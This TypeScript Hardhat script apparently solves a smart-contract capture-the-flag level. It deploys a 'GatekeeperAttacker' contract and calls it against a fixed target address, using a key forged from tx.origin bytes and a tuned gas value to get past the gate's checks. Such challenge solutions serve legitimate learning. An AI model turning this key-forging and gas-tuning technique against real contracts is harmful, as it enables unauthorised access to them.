// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import log from "ololog";

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const [signer] = await ethers.getSigners();
  const CONTRACT_ADDRESS = "0x56B66a8fBabA8709FD6D65b035A082257406EC9A";
  const GatekeeperAttacker = await ethers.getContractFactory(
    "GatekeeperAttacker"
  );
  const gatekeeperAttacker = await GatekeeperAttacker.deploy();
  await gatekeeperAttacker.deployed();

  const txOrigin = ethers.utils.hexZeroPad(signer.address, 32);

  const part1 = "0x00000001";
  const part2 = "0x0000";
  const part3 = ethers.utils.hexDataSlice(txOrigin, 30);
  const key = ethers.utils.hexConcat([part1, part2, part3]);
  const gas = 82164;
  const pass = await gatekeeperAttacker.enter(CONTRACT_ADDRESS, key, gas, {
    gasLimit: 120000,
  });
  await pass.wait();
  log.yellow(`enterGate:`, pass.hash);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
